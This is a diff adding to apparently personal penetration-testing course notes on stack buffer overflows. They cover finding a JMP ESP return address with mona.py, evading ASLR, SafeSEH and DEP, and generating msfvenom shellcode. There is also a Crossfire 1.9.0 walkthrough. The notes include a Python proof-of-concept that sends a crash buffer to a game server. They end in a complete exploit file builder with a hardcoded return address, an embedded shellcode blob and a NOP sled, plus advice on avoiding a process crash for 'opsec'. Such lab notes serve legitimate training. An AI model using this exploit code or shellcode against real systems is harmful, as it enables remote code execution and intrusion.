@@ -192,6 +192,113 @@ FINDING A RETURN ADDRESS:
 To ensure we have a consistent place to leverage our shellcode we can capture 
 the JMP ESP instruction. This will jump to the address in the ESP when executed.
 If we find a static address with this instruction, we can redirect the EIP to 
-that address, ensuring we always get the code to run. 
+that address, ensuring we always get the code to run. The address must be static
+so any library compiled with ASLR doesn't work. The address of the instruction
+also cannot contain any bad characters that would break the exploit. This is 
+because the memory address will be the start of our buffer. 
+
+IDB has a mona.py script which will help. !mona modules command gives info on 
+all DLLs used by the application. You want the memory protections set to false
+(ASLR, SafeSEH and NXCompat). Once you find a module without mem protections, 
+look for a static JMP ESP instruction. If DEP (NXCompat) is enabled, you can 
+only use a JMP ESP located in the .text code segment of the module.
+
+msf-nasm_shell will tell you what the JMP ESP instruction should look like: FFE4
+
+using !mona find -s "\xff\xe4" -m <module.dll> will show you the location of 
+all JMP ESP instructions in the vulnerable module you have discovered. Find a 
+pointer that doesn't have nay bad chars and Go to Address in Disassembler. 
+Make sure your EIP points to this address at the time of the crash and you will
+get your shell. Endian ordering, so address 0x10090c83 would be eip = "\x83\x0c\x09\x10"
+
+Now you have your address and control over it. Just make some shellcode with
+msfvenom and you're good to go. Your injection should now look like this:
+
+filler("A") + EIP(endian) + offset + nops + shellcode
+
+With all these pieces together you should be able to send it and get a shell.
+
+Sometimes network based payloads like shell_reverse_tcp don't work so you have 
+to go with something like windows/exec CMD="cmd.exe" and see what happens with 
+a non-network dependent payload.
+
+It is very important to include the EXITFUNC=thread option when generating 
+shellcode, as this will only close down the thread instead of the entire
+process you have exploited. The default option for msfvenom is to use the 
+ExitProcess API, which will bring the whole process down when the exploit is
+triggered. Opsec nightmare.
+
+        ===========
+         ON LINUX
+        ===========
+There is a debugger in linux that looks like immunity that I didn't know about
+until this course. It's called edb and you run it with edb. Awesome.
+You can search for and attach processes just like Immunity (F3). 
+
+Generating a buffer overflow is the same as before. For this, we are going to use
+Crossfire 1.9.0 MMORPG and the proof of concept below:
+#!/usr/bin/python
+import socket
+
+host = "10.11.0.128"
+
+crash = "\x41" * 4379
+
+buffer = "\x11(setup sound " + crash + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+
+s.connect((host, 13327))
+print s.recv(1024)
+
+s.send(buffer)
+s.close()
+
+print "[*]Payload Sent !"
+
+Remember we are trying to fill the formula of:
+filler + EIP + offset + nops + shellcode
+
+Once you confirm the crash, control the EIP using msf-pattern_create -l 4379
+The length matches the crash variable in the POC. Run the POC with the custom 
+buffer (replace crash var) and grab the hex values in the EIP.
+msf-pattern_offset -q <hex data> 
+will give you an exact match at offset [number]
+You can now determine exactly where your EIP is located in the string.
+Fill it with 4 Bs right now so you don't forget about it later. 
+
+Now we look for a place to put our shellcode by checking for registers that
+point to our buffer at the time of the crash. This is a pain in the ass, and 
+involves using msf-nasm_shell to identify instructions in the code. 
+
+After that you check for bad chars. Once those have been zeroed, find your 
+return address by finding a valid assembly instruction to redirect code exec to
+the memory location pointed to by the ESP. This can be done with EDB OpcodeSearcher.
+
+Make your shellcode and you're good.
+
+
+
+
+
+
+#!/bin/python3
+offset = b'A'*98
+eip = b'\x5e\x51\x9a\x5e'
+buf =  b""
+buf += b"\xda\xcc\xbf\xb4\xa8\x07\x85\xd9\x74\x24\xf4\x58"
+buf += b"\x29\xc9\xb1\x12\x31\x78\x17\x83\xe8\xfc\x03\xcc"
+buf += b"\xbb\xe5\x70\x1d\x67\x1e\x99\x0e\xd4\xb2\x34\xb2"
+buf += b"\x53\xd5\x79\xd4\xae\x96\xe9\x41\x81\xa8\xc0\xf1"
+buf += b"\xa8\xaf\x23\x99\xea\xf8\xa3\xef\x83\xfa\x4b\xab"
+buf += b"\x01\x72\xaa\x03\xcf\xd4\x7c\x30\xa3\xd6\xf7\x57"
+buf += b"\x0e\x58\x55\xff\xff\x76\x29\x97\x97\xa7\xe2\x05"
+buf += b"\x01\x31\x1f\x9b\x82\xc8\x01\xab\x2e\x06\x41"
+nops = (b'\x90')*16
+end = b'A' * (1500 - (len(offset) + len(eip) + len(nops) + len(buf)))
+buff = offset + eip + nops  + buf + end
+with open('exploit.txt','wb') as f:
+    f.write(buff)
 
 
